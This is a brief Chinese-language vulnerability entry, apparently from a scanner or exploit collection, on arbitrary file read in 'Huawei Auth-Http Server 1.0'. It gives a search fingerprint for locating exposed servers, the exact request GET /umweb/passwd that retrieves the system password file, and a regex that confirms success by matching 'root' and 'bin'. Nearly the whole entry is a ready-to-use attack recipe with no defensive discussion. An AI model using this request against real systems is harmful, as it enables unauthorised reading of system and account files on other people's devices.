# 华为Auth-Http服务任意文件读取

华为 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`server="Huawei Auth-Http Server 1.0"`
- **请求**：`GET /umweb/passwd HTTP/1.1`
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$